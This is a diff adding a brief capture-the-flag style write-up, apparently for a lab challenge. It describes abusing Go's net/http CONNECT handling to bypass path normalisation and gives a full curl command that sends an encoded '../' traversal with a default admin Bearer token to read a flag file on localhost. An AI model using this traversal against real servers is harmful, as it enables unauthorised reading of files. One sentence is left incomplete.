@@ -1,0 +1,15 @@
+https://github.com/golang/go/blob/9bb97ea047890e900dae04202a231685492c4b18/src/net/http/server.go#L2354-L2364
+
+The problem with viewing the file is the path normalization
+
+And there is a verb in golang
+
+https://github.com/golang/go/blob/9bb97ea047890e900dae04202a231685492c4b18/src/net/http/server.go#L2354-L2364
+
+Abusing http verb connect , we craft payloads like: which bypasses path normalization:
+
+Read with readlink /proc/self/cwd
+
+then 
+
+curl -X GET --path-as-is -H "Authorization: Bearer YWRtaW46YWRtaW4=" http://localhost:40048/request/http%3A%2F%2Flocalhost:40048/view/..%2Flag_oDcCvVYPigJg.txt?method=CONNECT
